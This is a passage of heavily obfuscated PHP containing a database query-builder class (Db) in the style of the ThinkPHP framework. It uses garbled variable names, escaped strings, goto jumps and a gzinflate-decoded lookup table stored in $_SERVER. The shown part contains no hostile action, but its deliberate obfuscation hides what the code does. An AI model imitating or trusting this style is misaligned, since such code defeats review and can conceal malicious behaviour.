"\50{$¯æ¯úù}\51"; if (!isset($ïÕ÷ÄĞ[$…Â’ºÎï])) { return $…Â’ºÎï; } } return $…Â’ºÎï; } } goto D‹ÙÏÀ“šè; bö½æè­: $_SERVER[óƒÂÃÊÛ] = explode($_SERVER[óó‹¸‚å][616], gzinflate(substr($_SERVER[óó‹¸‚å][617], 10, -8))); $uygjmopetr = $_SERVER[óó‹¸‚å][618]; if (!$uygjmopetr) { return; } goto B×ÓÔ†ƒŸÎ; f‰‹”¹Óé·: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\x71" => "\74\x3e", "\x67\x74" => "\76", "\145\x67\x74" => "\x3e\x3d", "\154\164" => "\74", "\145\x6c\x74" => "\74\x3d", "\x6e\x6f\164\154\x69\x6b\x65" => "\x4e\x4f\x54\x20\114\x49\113\x45", "\x6c\x69\x6b\145" => "\x4c\111\113\x45", "\x69\156" => "\x49\116", "\156\x6f\164\x69\156" => "\116\117\x54\40\111\x4e", "\x6e\x6f\164\x20\x69\x6e" => "\x4e\x4f\124\x20\111\116", "\142\x65\x74\167\145\x65\156" => "\102\105\124\127\x45\x45\x4e", "\x6e\157\164\142\x65\x74\167\145\x65\x6e" => "\x4e\x4f\124\x20\x42\x45\x54\127\x45\105\116", "\x6e\157\x74\x20\x62\x65\164\167\x65\x65\x6e" => "\116\117\124\x20\x42\105\124\x57\105\105\116"); protected $selectSql = "\123\x45\x4c\105\x43\124\x25\104\x49\123\x54\111\x4e\x43\124\45\x20\45\106\111\x45\114\104\45\40\106\x52\x4f\115\x20\45\x54\101\x42\114\x45\45\45\112\117\111\x4e\45\x25\x57\110\x45\x52\105\45\45\107\122\117\x55\x50\45\x25\110\101\126\111\x4e\x47\45\45\117\122\x44\105\x52\45\45\x4c\111\x4d\111\x54\45\x20\45\125\116\111\117\116\x25\45\103\117\115\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $÷®Í”¥¬ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[óó‹¸‚å][967], $÷®Í”¥¬); } public function factory($ø¸’áÛ½ = '') { $ê›Ãôğğ =& $_SERVER[óó‹¸‚å]; $ø¸’áÛ½ = $this->parseConfig($ø¸’áÛ½); if (empty($ø¸’áÛ½[$ê›Ãôğğ[968]])) { think_exception(think_lang($ê›Ãôğğ[969])); } $this->dbType = ucwords(strtolower($ø¸’áÛ½[$ê›Ãôğğ[968]])); $¹‹ÄÎš¸ = $ê›Ãôğğ[970] . $this->dbType; if (class_exists($¹‹ÄÎš¸)) { $ì†Á¶Å = new $¹‹ÄÎš¸($ø¸’áÛ½); if ($ê›Ãôğğ[971] != strtolower($ø¸’áÛ½[$ê›Ãôğğ[968]])) { $ì†Á¶Å->dbType = strtoupper($this->dbType); } else { $ì†Á¶Å->dbType = $this->_getDsnType($ø¸’áÛ½[$ê›Ãôğğ[923]]); } } else { think_exception(think_lang($ê›Ãôğğ[972]) . $ê›Ãôğğ[973] . $¹‹ÄÎš¸); } return $ì†Á¶Å; } public function __call($…“ûŞ¦, $Â›…Óé) { if (method_exists($this, $…“ûŞ¦)) { return call_user_func_array(array($this, $…“ûŞ¦), $Â›…Óé); } } protected function _getDsnType($“²¨–‡) { $æ³¥ùï’ = explode($_SERVER[óó‹¸‚å][4], $“²¨–‡); $ó©Ÿõ»ï = strtoupper(trim($æ³¥ùï’[0])); return $ó©Ÿõ»ï; } private function parseConfig($õÎâıãÌ = '') { $”¼ˆàÕÄ =& $_SERVER[óó‹¸‚å]; if (!empty($õÎâıãÌ) && is_string($õÎâıãÌ)) { $õÎâıãÌ = $this->parseDSN($õÎâıãÌ); } elseif (is_array($õÎâıãÌ)) { $õÎâıãÌ = array_change_key_case($õÎâıãÌ); $õÎâıãÌ = array($”¼ˆàÕÄ[968] => $õÎâıãÌ[$”¼ˆàÕÄ[974]], $”¼ˆàÕÄ[895] => $õÎâıãÌ[$”¼ˆàÕÄ[975]], $”¼ˆàÕÄ[896] => $õÎâıãÌ[$”¼ˆàÕÄ[976]], $”¼ˆàÕÄ[893] => $õÎâıãÌ[$”¼ˆàÕÄ[977]], $”¼ˆàÕÄ[894] => $õÎâıãÌ[$”¼ˆàÕÄ[978]], $”¼ˆàÕÄ[21] => $õÎâıãÌ[$”¼ˆàÕÄ[979]], $”¼ˆàÕÄ[923] => $õÎâıãÌ[$”¼ˆàÕÄ[980]], $”¼ˆàÕÄ[17] => isset($õÎâıãÌ[$”¼ˆàÕÄ[981]]) ? $õÎâıãÌ[$”¼ˆàÕÄ[981]] : array()); } elseif (empty($õÎâıãÌ)) { if (think_config($”¼ˆàÕÄ[982]) && $”¼ˆàÕÄ[971] != strtolower(think_config($”¼ˆàÕÄ[983]))) { $õÎâıãÌ = $this->parseDSN(think_config($”¼ˆàÕÄ[982])); } else { $õÎâıãÌ = array($”¼ˆàÕÄ[968] => think_config($”¼ˆàÕÄ[983]), $”¼ˆàÕÄ[895] => think_config($”¼ˆàÕÄ[984]), $”¼ˆàÕÄ[896] => think_config($”¼ˆàÕÄ[985]), $”¼ˆàÕÄ[893] => think_config($”¼ˆàÕÄ[986]), $”¼ˆàÕÄ[894] => think_config($”¼ˆàÕÄ[987]), $”¼ˆàÕÄ[21] => think_config($”¼ˆàÕÄ[246]), $”¼ˆàÕÄ[923] => think_config($”¼ˆàÕÄ[982]), $”¼ˆàÕÄ[17] => think_config($”¼ˆàÕÄ[988])); } } return $õÎâıãÌ; } protected function initConnect($çÚ¿ü¢ì = true) { if (1 == think_config($_SERVER[óó‹¸‚å][22])) { $this->_linkID = $this->multiConnect($çÚ¿ü¢ì); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $âµå„ğ  => $Õ “ûÅ) { $this->_linkID = $Õ “ûÅ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($­ãøß¹ = false) { $ÑÃ‘¦û¡ =& $_SERVER[óó‹¸‚å]; static $İºİÎÊ = array(); static $å»«µü• = -1; if (empty($İºİÎÊ)) { foreach ($this->config as $Òù†‹©Ì => $­ß·˜ÒÊ) { $İºİÎÊ[$Òù†‹©Ì] = explode($ÑÃ‘¦û¡[50], $­ß·˜ÒÊ); } } if (think_config($ÑÃ‘¦û¡[989])) { if ($­ãøß¹ || think_config($ÑÃ‘¦û¡[395]) === !0) { $îÚ´¨® = floor(mt_rand(0, think_config($ÑÃ‘¦û¡[990]) - 1)); $å»«µü• = $îÚ´¨®; } else { if (is_numeric(think_config($ÑÃ‘¦û¡[991]))) { $îÚ´¨® = think_config($ÑÃ‘¦û¡[991]); } else { $îÚ´¨® = floor(mt_rand(think_config($ÑÃ‘¦û¡[990]), count($İºİÎÊ[$ÑÃ‘¦û¡[893]]) - 1)); } } } else { $îÚ´¨® = floor(mt_rand(0, count($İºİÎÊ[$ÑÃ‘¦û¡[893]]) - 1)); $å»«µü• = $îÚ´¨®; } $îÚ´¨® = $å»«µü• !== -1 ? $å»«µü• : $îÚ´¨®; $²Éı€ß˜ = array($ÑÃ‘¦û¡[895] => isset($İºİÎÊ[$ÑÃ‘¦û¡[895]][$îÚ´¨®]) ? $İºİÎÊ[$ÑÃ‘¦û¡[895]][$îÚ´¨®] : $İºİÎÊ[$ÑÃ‘¦û¡[895]][0], $ÑÃ‘¦û¡[896] => isset($İºİÎÊ[$ÑÃ‘¦û¡[896]][$îÚ´¨®]) ? $İºİÎÊ[$ÑÃ‘¦û¡[896]][$îÚ´¨®] : $İºİÎÊ[$ÑÃ‘¦û¡[896]][0], $ÑÃ‘¦û¡[893] => isset($İºİÎÊ[$ÑÃ‘¦û¡[893]][$îÚ´¨®]) ? $İºİÎÊ[$ÑÃ‘¦û¡[893]][$îÚ´¨®] : $İºİÎÊ[$ÑÃ‘¦û¡[893]][0], $ÑÃ‘¦û¡[894] => isset($İºİÎÊ[$ÑÃ‘¦û¡[894]][$îÚ´¨®]) ? $İºİÎÊ[$ÑÃ‘¦û¡[894]][$îÚ´¨®] : $İºİÎÊ[$ÑÃ‘¦û¡[894]][0], $ÑÃ‘¦û¡[21] => isset($İºİÎÊ[$ÑÃ‘¦û¡[21]][$îÚ´¨®]) ? $İºİÎÊ[$ÑÃ‘¦û¡[21]][$îÚ´¨®] : $İºİÎÊ[$ÑÃ‘¦û¡[21]][0], $ÑÃ‘¦û¡[923] => isset($İºİÎÊ[$ÑÃ‘¦û¡[923]][$îÚ´¨®]) ? $İºİÎÊ[$ÑÃ‘¦û¡[923]][$îÚ´¨®] : $İºİÎÊ[$ÑÃ‘¦û¡[923]][0], $ÑÃ‘¦û¡[17] => isset($İºİÎÊ[$ÑÃ‘¦û¡[17]][$îÚ´¨®]) ? $İºİÎÊ[$ÑÃ‘¦û¡[17]][$îÚ´¨®] : $İºİÎÊ[$ÑÃ‘¦û¡[17]][0]); return $this->connect($²Éı€ß˜, $îÚ´¨®); } public function parseDSN($„öáã§Š) { $º–¼´Ô™ =& $_SERVER[óó‹¸‚å]; if (empty($„öáã§Š)) { return !1; } $›Øùš¾Ÿ = parse_url($„öáã§Š); if ($›Øùš¾Ÿ[$º–¼´Ô™[180]]) { $Óí ÒéÊ = array($º–¼´Ô™[968] => $›Øùš¾Ÿ[$º–¼´Ô™[180]], $º–¼´Ô™[895] => isset($›Øùš¾Ÿ[$º–¼´Ô™[600]]) ? $›Øùš¾Ÿ[$º–¼´Ô™[600]] : $º–¼´Ô™[12], $º–¼´Ô™[896] => isset($›Øùš¾Ÿ[$º–¼´Ô™[992]]) ? $›Øùš¾Ÿ[$º–¼´Ô™[992]] : $º–¼´Ô™[12], $º–¼´Ô™[893] => isset($›Øùš¾Ÿ[$º–¼´Ô™[181]]) ? $›Øùš¾Ÿ[$º–¼´Ô™[181]] : $º–¼´Ô™[12], $º–¼´Ô™[894] => isset($›Øùš¾Ÿ[$º–¼´Ô™[182]]) ? $›Øùš¾Ÿ[$º–¼´Ô™[182]] : $º–¼´Ô™[12], $º–¼´Ô™[21] => isset($›Øùš¾Ÿ[$º–¼´Ô™[84]]) ? substr($›Øùš¾Ÿ[$º–¼´Ô™[84]], 1) : $º–¼´Ô™[12]); } else { preg_match($º–¼´Ô™[993], trim($„öáã§Š), $Ó‡ø°¢·); $Óí ÒéÊ = array($º–¼´Ô™[968] => $Ó‡ø°¢·[1], $º–¼´Ô™[895] => $Ó‡ø°¢·[2], $º–¼´Ô™[896] => $Ó‡ø°¢·[3], $º–¼´Ô™[893] => $Ó‡ø°¢·[4], $º–¼´Ô™[894] => $Ó‡ø°¢·[5], $º–¼´Ô™[21] => $Ó‡ø°¢·[6]); } $Óí ÒéÊ[$º–¼´Ô™[923]] = $º–¼´Ô™[12]; return $Óí ÒéÊ; } protected function debug() { $ğ£¦åĞŠ =& $_SERVER[óó‹¸‚å]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ğ£¦åĞŠ[994]; if (think_config($ğ£¦åĞŠ[995])) { think_status($ğ£¦åĞŠ[996]); think_trace($this->queryStr . $ğ£¦åĞŠ[997] . think_status($ğ£¦åĞŠ[24], $ğ£¦åĞŠ[996], 6) . $ğ£¦åĞŠ[998], $ğ£¦åĞŠ[12], $ğ£¦åĞŠ[999]); } } protected function parseLock($¬ÔÅíş‘ = false) { $•‚èî°İ =& $_SERVER[óó‹¸‚å]; if (!$¬ÔÅíş‘) { return $•‚èî°İ[12]; } if ($•‚èî°İ[925] == $this->dbType) { return $•‚èî°İ[1000]; } return $•‚èî°İ[1001]; } protected function parseSet($¡…¼¿Ğ—) { $»°ÒÀ™ =& $_SERVER[óó‹¸‚å]; foreach ($¡…¼¿Ğ— as $‹›¼Ğèú => $ØßùÌƒ¼) { if (is_array($ØßùÌƒ¼) && $»°ÒÀ™[297] == $ØßùÌƒ¼[0]) { $§•§äß[] = $this->parseKey($‹›¼Ğèú) . $»°ÒÀ™[891] . $ØßùÌƒ¼[1]; } elseif (is_scalar($ØßùÌƒ¼) || is_null($ØßùÌƒ¼)) { $§•§äß[] = $this->parseKey($‹›¼Ğèú) . $»°ÒÀ™[891] . $this->parseValue($ØßùÌƒ¼); } } return $»°ÒÀ™[1002] . implode($»°ÒÀ™[50], $§•§äß); } protected function bindParam($‘Ú†ÑîË, $õÆ„­ñÜ) { $this->bind[$_SERVER[óó‹¸‚å][4] . $‘Ú†ÑîË] = $õÆ„­ñÜ; } protected function parseBind($÷¹ ßıí) { $÷¹ ßıí = array_merge($this->bind, $÷¹ ßıí); $this->bind = array(); return $÷¹ ßıí; } function parseKey(&$ä£ôÍöÕ, $ƒãÒİéÍ = true) { if ($ƒãÒİéÍ) { $ä£ôÍöÕ = $this->parseKeyCheck($ä£ôÍöÕ); } return $ä£ôÍöÕ; } function parseKeyCheck($©ƒÈ¢ä©) { $­á”óò® =& $_SERVER[óó‹¸‚å]; $©ƒÈ¢ä© = trim($©ƒÈ¢ä©); if (!preg_match($­á”óò®[1003], $©ƒÈ¢ä©)) { think_exception($­á”óò®[1004] . $©ƒÈ¢ä©); } return $©ƒÈ¢ä©; } protected function parseValue($»Ù¶ÌãÔ) { $Áƒ²§ŒÃ =& $_SERVER[óó‹¸‚å]; if (is_string($»Ù¶ÌãÔ)) { $»Ù¶ÌãÔ = $Áƒ²§ŒÃ[964] . $this->escapeString($»Ù¶ÌãÔ) . $Áƒ²§ŒÃ[964]; } elseif (isset($»Ù¶ÌãÔ[0]) && is_string($»Ù¶ÌãÔ[0]) && strtolower($»Ù¶ÌãÔ[0]) == $Áƒ²§ŒÃ[297]) { $»Ù¶ÌãÔ = $this->escapeString($»Ù¶ÌãÔ[1]); } elseif (is_array($»Ù¶ÌãÔ)) { $»Ù¶ÌãÔ = array_map(array($this, $Áƒ²§ŒÃ[965]), $»Ù¶ÌãÔ); } elseif (is_bool($»Ù¶ÌãÔ)) { $»Ù¶ÌãÔ = $»Ù¶ÌãÔ ? $Áƒ²§ŒÃ[88] : $Áƒ²§ŒÃ[197]; } elseif (is_null($»Ù¶ÌãÔ)) { $»Ù¶ÌãÔ = $Áƒ²§ŒÃ[103]; } return $»Ù¶ÌãÔ; } protected function parseField($å’È’îÏ) { $îÅªï‰¢ =& $_SERVER[óó‹¸‚å]; if (is_string($å’È’îÏ) && strpos($å’È’îÏ, $îÅªï‰¢[50])) { $å’È’îÏ = explode($îÅªï‰¢[50], $å’È’îÏ); } if (is_array($å’È’îÏ)) { $»¤¼ÚÑ› = array(); foreach ($å’È’îÏ as $ò‰É«ÑÑ => $ö¢Í¸£Ë) { if (!is_numeric($ò‰É«ÑÑ)) { $»¤¼ÚÑ›[] = $this->parseKey($ò‰É«ÑÑ, !1) . $îÅªï‰¢[1005] . $this->parseKey($ö¢Í¸£Ë); } else { $»¤¼ÚÑ›[] = $this->parseKey($ö¢Í¸£Ë); } } $úß­ÑÜ¾ = implode($îÅªï‰¢[50], $»¤¼ÚÑ›); } elseif (is_string($å’È’îÏ) && !empty($å’È’îÏ)) { $úß­ÑÜ¾ = $å’È’îÏ; } else { $úß­ÑÜ¾ = $îÅªï‰¢[188]; } return $úß­ÑÜ¾; } protected function parseTable($³æœßÚ®) { $…ÙŞÁÑ =& $_SERVER[óó‹¸‚å]; if (is_array($³æœßÚ®)) { $ÇŠĞÏ´Ä = array(); foreach ($³æœßÚ® as $¨–µèŠ => $¹ä‚ƒêÜ) { if (!is_numeric($¨–µèŠ)) { $ÇŠĞÏ´Ä[] = $this->parseKey($¨–µèŠ) . $…ÙŞÁÑ[53] . $this->parseKey($¹ä‚ƒêÜ); } else { $ÇŠĞÏ´Ä[] = $this->parseKey($¨–µèŠ); } } $³æœßÚ® = $ÇŠĞÏ´Ä; } elseif (is_string($³æœßÚ®)) { if (strstr($³æœßÚ®, $…ÙŞÁÑ[53])) { return $³æœßÚ®; } $³æœßÚ® = explode($…ÙŞÁÑ[50], $³æœßÚ®); array_walk($³æœßÚ®, array($this, $…ÙŞÁÑ[913])); } return $…ÙŞÁÑ[907] . trim(implode($…ÙŞÁÑ[1006], $³æœßÚ®), $…ÙŞÁÑ[385]) . $…ÙŞÁÑ[907]; } protected function parseWhere($ñ¾Î–¯Ñ) { $†¨á”ì° =& $_SERVER[óó‹¸‚å]; $Æ¶©¨Ç = $†¨á”ì°[12]; if (is_string($ñ¾Î–¯Ñ)) { $Æ¶©¨Ç = $ñ¾Î–¯Ñ; } else { $úİóí›¢ = isset($ñ¾Î–¯Ñ[$†¨á”ì°[1007]]) ? strtoupper($ñ¾Î–¯Ñ[$†¨á”ì°[1007]]) : $†¨á”ì°[12]; if (in_array($úİóí›¢, array($†¨á”ì°[1008], $†¨á”ì°[1009], $†¨á”ì°[1010]))) { $úİóí›¢ = $†¨á”ì°[53] . $úİóí›¢ . $†¨á”ì°[53]; unset($ñ¾Î–¯Ñ[$†¨á”ì°[1007]]); } else { $úİóí›¢ = $†¨á”ì°[1011]; } foreach ($ñ¾Î–¯Ñ as $›ƒ¯Ê”‚ => $¡’”Æ¬) { $Æ¶©¨Ç .= $†¨á”ì°[277]; if (is_numeric($›ƒ¯Ê”‚)) { $›ƒ¯Ê”‚ = $†¨á”ì°[1012]; } if (0 === strpos($›ƒ¯Ê”‚, $†¨á”ì°[11])) { $Æ¶©¨Ç .= $this->parseThinkWhere($›ƒ¯Ê”‚, $¡’”Æ¬); } else { if (!preg_match($†¨á”ì°[1013], trim($›ƒ¯Ê”‚))) { think_exception(think_lang($†¨á”ì°[1014]) . $†¨á”ì°[4] . $›ƒ¯Ê”‚); } $â»ßÔ«º = is_array($¡’”Æ¬) && isset($¡’”Æ¬[$†¨á”ì°[1015]]); $›ƒ¯Ê”‚ = trim($›ƒ¯Ê”‚); if (strpos($›ƒ¯Ê”‚, $†¨á”ì°[283])) { $‹³œÍ°Ì = explode($†¨á”ì°[283], $›ƒ¯Ê”‚); $¼ú„ıª¥ = array(); foreach ($‹³œÍ°Ì as $Íã¸’ıà => $©åÆîíó) { $¯çƒÍÙ¦ = $â»ßÔ«º ? $¡’”Æ¬[$Íã¸’ıà] : $¡’”Æ¬; $¼ú„ıª¥[] = $†¨á”ì°[260] . $this->parseWhereItem($this->parseKey($©åÆîíó), $¯çƒÍÙ¦) . $†¨á”ì°[912]; } $Æ¶©¨Ç .= implode($†¨á”ì°[1016], $¼ú„ıª¥); } elseif (strpos($›ƒ¯Ê”‚, $†¨á”ì°[284])) { $‹³œÍ°Ì = explode($†¨á”ì°[284], $›ƒ¯Ê”‚); $¼ú„ıª¥ = array(); foreach ($‹³œÍ°Ì as $Íã¸’ıà => $©åÆîíó) { $¯çƒÍÙ¦ = $â»ßÔ«º ? $¡’”Æ¬[$Íã¸’ıà] : $¡’”Æ¬; $¼ú„ıª¥[] = $†¨á”ì°[260] . $this->parseWhereItem($this->parseKey($©åÆîíó), $¯çƒÍÙ¦) . $†¨á”ì°[912]; } $Æ¶©¨Ç .= implode($†¨á”ì°[1011], $¼ú„ıª¥); } else { $Æ¶©¨Ç .= $this->parseWhereItem($this->parseKey($›ƒ¯Ê”‚), $¡’”Æ¬); } } $Æ¶©¨Ç .= $†¨á”ì°[278] . $úİóí›¢; } $Æ¶©¨Ç = substr($Æ¶©¨Ç, 0, -strlen($úİóí›¢)); } return empty($Æ¶©¨Ç) ? $†¨á”ì°[12] : $†¨á”ì°[1017] . $Æ¶©¨Ç; } protected function parseWhereItem($éÚ€…ì«, $ÊÏÇÍ) { $åíÇ‚ã =& $_SERVER[óó‹¸‚å]; $„ù¢µÓ¹ = $åíÇ‚ã[12]; if (is_array($ÊÏÇÍ)) { if (is_string($ÊÏÇÍ[0])) { $‚¥ï×ÍÑ = strtolower($ÊÏÇÍ[0]); if (in_array($ÊÏÇÍ[0], array($åíÇ‚ã[891], $åíÇ‚ã[1018], $åíÇ‚ã[1019], $åíÇ‚ã[1020], $åíÇ‚ã[1021], $åíÇ‚ã[1022]))) { $„ù¢µÓ¹ .= $éÚ€…ì« . $åíÇ‚ã[53] . $ÊÏÇÍ[0] . $åíÇ‚ã[53] . $this->parseValue($ÊÏÇÍ[1]); } elseif (preg_match($åíÇ‚ã[1023], $ÊÏÇÍ[0])) { $„ù¢µÓ¹ .= $éÚ€…ì« . $åíÇ‚ã[53] . $this->exp[$‚¥ï×ÍÑ] . $åíÇ‚ã[53] . $this->parseValue($ÊÏÇÍ[1]); } elseif (preg_match($åíÇ‚ã[1024], $ÊÏÇÍ[0])) { if (is_array($ÊÏÇÍ[1])) { $Ê§÷·¹» = isset($ÊÏÇÍ[2]) ? strtoupper($ÊÏÇÍ[2]) : $åíÇ‚ã[1009]; if (in_array($Ê§÷·¹», array($åíÇ‚ã[1008], $åíÇ‚ã[1009], $åíÇ‚ã[1010]))) { $Æ´¸¼‡ê = array(); foreach ($ÊÏÇÍ[1] as $–—êûá) { $Æ´¸¼‡ê[] = $éÚ€…ì« . $åíÇ‚ã[53] . $this->exp[$‚¥ï×ÍÑ] . $åíÇ‚ã[53] . $this->parseValue($–—êûá); } $„ù¢µÓ¹ .= $åíÇ‚ã[260] . implode($åíÇ‚ã[53] . $Ê§÷·¹» . $åíÇ‚ã[53], $Æ´¸¼‡ê) . $åíÇ‚ã[912]; } } else { $„ù¢µÓ¹ .= $éÚ€…ì« . $åíÇ‚ã[53] . $this->exp[$‚¥ï×ÍÑ] . $åíÇ‚ã[53] . $this->parseValue($ÊÏÇÍ[1]); } } elseif ($åíÇ‚ã[297] == $‚¥ï×ÍÑ) { $„ù¢µÓ¹ .= $åíÇ‚ã[910] . $éÚ€…ì« . $åíÇ‚ã[53] . $ÊÏÇÍ[1] . $åíÇ‚ã[1025]; } elseif (preg_match($åíÇ‚ã[1026], $ÊÏÇÍ[0])) { $„ù¢µÓ¹ .= $ÊÏÇÍ[0]; } elseif (preg_match($åíÇ‚ã[1027], $ÊÏÇÍ[0])) { if (isset($ÊÏÇÍ[2]) && $åíÇ‚ã[297] == $ÊÏÇÍ[2]) { $„ù¢µÓ¹ .= $éÚ€…ì« . $åíÇ‚ã[53] . $this->exp[$‚¥ï×ÍÑ] . $åíÇ‚ã[53] . $ÊÏÇÍ[1]; } else { if (is_string($ÊÏÇÍ[1])) { $ÊÏÇÍ[1] = explode($åíÇ‚ã[50], $ÊÏÇÍ[1]); } $—‰õ®§‹ = implode($åíÇ‚ã[50], $this->parseValue($ÊÏÇÍ[1])); $„ù¢µÓ¹ .= $éÚ€…ì« . $åíÇ‚ã[53] . $this->exp[$‚¥ï×ÍÑ] . $åíÇ‚ã[910] . $—‰õ®§‹ . $åíÇ‚ã[912]; } } elseif (preg_match($åíÇ‚ã[1028], $ÊÏÇÍ[0])) { $æ¯İÈª· = is_string($ÊÏÇÍ[1]) ? explode($åíÇ‚ã[50], $ÊÏÇÍ[1]) : $ÊÏÇÍ[1]; $„ù¢µÓ¹ .= $åíÇ‚ã[910] . $éÚ€…ì« . $åíÇ‚ã[53] . $this->exp[$‚¥ï×ÍÑ] . $åíÇ‚ã[53] . $this->parseValue($æ¯İÈª·[0]) . $åíÇ‚ã[1011] . $this->parseValue($æ¯İÈª·[1]) . $åíÇ‚ã[278]; } else { think_exception(think_lang($åíÇ‚ã[1014]) . $åíÇ‚ã[4] . $ÊÏÇÍ[0]); } } else { $À¯ó•í = count($ÊÏÇÍ); $õÕëŠ• = $åíÇ‚ã[12]; if (is_string($ÊÏÇÍ[$À¯ó•í - 1])) { $õÕëŠ• = isset($ÊÏÇÍ[$À¯ó•í - 1]) ? strtoupper($ÊÏÇÍ[$À¯ó•í - 1]) : $åíÇ‚ã[12]; if (in_array($õÕëŠ•, array($åíÇ‚ã[1008], $åíÇ‚ã[1009], $åíÇ‚ã[1010]))) { $À¯ó•í = $À¯ó•í - 1; } } else { $õÕëŠ• = $åíÇ‚ã[1008]; } for ($Äğ³¢»¢ = 0; $Äğ³¢»¢ < $À¯ó•í; $Äğ³¢»¢++) { $æ¯İÈª· = is_array($ÊÏÇÍ[$Äğ³¢»¢]) ? $ÊÏÇÍ[$Äğ³¢»¢][1] : $ÊÏÇÍ[$Äğ³¢»¢]; if ($åíÇ‚ã[297] == strtolower($ÊÏÇÍ[$Äğ³¢»¢][0])) { $„ù¢µÓ¹ .= $åíÇ‚ã[260] . $éÚ€…ì« . $åíÇ‚ã[53] . $æ¯İÈª· . $åíÇ‚ã[1025] . $õÕëŠ• . $åíÇ‚ã[53]; } else { $†³áºŠ = is_array($ÊÏÇÍ[$Äğ³¢»¢]) ? $this->exp[strtolower($ÊÏÇÍ[$Äğ³¢»¢][0])] : $åíÇ‚ã[891]; if (!$†³áºŠ && is_array($ÊÏÇÍ[$Äğ³¢»¢]) && in_array($ÊÏÇÍ[$Äğ³¢»¢][0], array($åíÇ‚ã[891], $åíÇ‚ã[1018], $åíÇ‚ã[1019], $åíÇ‚ã[1020], $åíÇ‚ã[1021], $åíÇ‚ã[1022]))) { $†³áºŠ = $ÊÏÇÍ[$Äğ³¢»¢][0]; } $„ù¢µÓ¹ .= $åíÇ‚ã[260] . $éÚ€…ì« . $åíÇ‚ã[53] . $†³áºŠ . $åíÇ‚ã[53] . $this->parseValue($æ¯İÈª·) . $åíÇ‚ã[1025] . $õÕëŠ• . $åíÇ‚ã[53]; } } $„ù¢µÓ¹ = substr($„ù¢µÓ¹, 0, -4); } } else { $„ù¢µÓ¹ .= $éÚ€…ì« . $åíÇ‚ã[1029] . $this->parseValue($ÊÏÇÍ); } return $„ù¢µÓ¹; } protected function parseThinkWhere($ÉåØëñä, $â»âœ‚) { $ŒàÎ’ô =& $_SERVER[óó‹¸‚å]; $ßìáí¤ğ = $ŒàÎ’ô[12]; switch ($ÉåØëñä) { case $ŒàÎ’ô[352]: $ßìáí¤ğ = $â»âœ‚; break; case $ŒàÎ’ô[1012]: $ßìáí¤ğ = is_string($â»âœ‚) ? $â»âœ‚ : substr($this->parseWhere($â»âœ‚), 6); break; case $ŒàÎ’ô[1030]: parse_str($â»âœ‚, $ô¨ÃÛ´ï); if (isset($ô¨ÃÛ´ï[$ŒàÎ’ô[1007]])) { $ƒ‡‘·›‘ = $ŒàÎ’ô[53] . strtoupper($ô¨ÃÛ´ï[$ŒàÎ’ô[1007]]) . $ŒàÎ’ô[53]; unset($ô¨ÃÛ´ï[$ŒàÎ’ô[1007]]); } else { $ƒ‡‘·›‘ = $ŒàÎ’ô[1011]; } $ÒÇãÍÊç = array(); foreach ($ô¨ÃÛ´ï as $½½´º× => $úú€ÕãŞ) { $ÒÇãÍÊç[] = $this->parseKey($½½´º×) . $ŒàÎ’ô[1029] . $this->parseValue($úú€ÕãŞ); } $ßìáí¤ğ = implode($ƒ‡‘·›‘, $ÒÇãÍÊç); break; } return $ßìáí¤ğ; } protected function parseLimit($Ë»µç¢×) { $¸®Ç—şç =& $_SERVER[óó‹¸‚å]; return !empty($Ë»µç¢×) ? $¸®Ç—şç[51] . $Ë»µç¢× . $¸®Ç—şç[53] : $¸®Ç—şç[12]; } protected function parseJoin($Òƒ°ØÑú) { $—Åê“¡ =& $_SERVER[óó‹¸‚å]; $Ö’€ÇÜ° = $—Åê“¡[12]; if (!empty($Òƒ°ØÑú)) { if (is_array($Òƒ°ØÑú)) { foreach ($Òƒ°ØÑú as $ãù÷ò·Õ => $Öµù­“) { if (!1 !== stripos($Öµù­“, $—Åê“¡[1031])) { $Ö’€ÇÜ° .= $—Åê“¡[53] . $Öµù­“; } else { $Ö’€ÇÜ° .= $—Åê“¡[1032] . $Öµù­“; } } } else { $Ö’€ÇÜ° .= $—Åê“¡[1032] . $Òƒ°ØÑú; } } $Ö’€ÇÜ° = preg_replace($—Åê“¡[1033], think_config($—Åê“¡[937]) . $—Åê“¡[1034], $Ö’€ÇÜ°); return $Ö’€ÇÜ°; } protected function parseOrder($¯ËÅ—àé) { $Ä‚œºıÓ =& $_SERVER[óó‹¸‚å]; if (is_array($¯ËÅ—àé)) { $²„›åœ€ = array(); foreach ($¯ËÅ—àé as $›áóÔœÛ => $¤¿ÁÃ Œ) { if (is_numeric($›áóÔœÛ)) { $²„›åœ€[] = $this->parseKey($¤¿ÁÃ Œ); } else { $¤¿ÁÃ Œ = in_array(strtoupper(trim($¤¿ÁÃ Œ)), array($Ä‚œºıÓ[1035], $Ä‚œºıÓ[1036])) ? $Ä‚œºıÓ[53] . $¤¿ÁÃ Œ : $Ä‚œºıÓ[12]; if (preg_match($Ä‚œºıÓ[1037], $›áóÔœÛ)) { $²„›åœ€[] = $this->parseKey($›áóÔœÛ) . $¤¿ÁÃ Œ; } else { think_exception($Ä‚œºıÓ[1038] . $›áóÔœÛ); } } } $¯ËÅ—àé = implode($Ä‚œºıÓ[50], $²„›åœ€); } return !empty($¯ËÅ—àé) ? $Ä‚œºıÓ[1039] . $¯ËÅ—àé : $Ä‚œºıÓ[12]; } protected function parseGroup($„Â˜Õ­Ê) { $ÃØ»Ù“ú =& $_SERVER[óó‹¸‚å]; return !empty($„Â˜Õ­Ê) ? $ÃØ»Ù“ú[1040] . $„Â˜Õ­Ê : $ÃØ»Ù“ú[12]; } protected function parseHaving($éë¾åÄ¬) { $Ÿ¦­Ñ„« =& $_SERVER[óó‹¸‚å]; return !empty($éë¾åÄ¬) ? $Ÿ¦­Ñ„«[1041] . $éë¾åÄ¬ : $Ÿ¦­Ñ„«[12]; } protected function 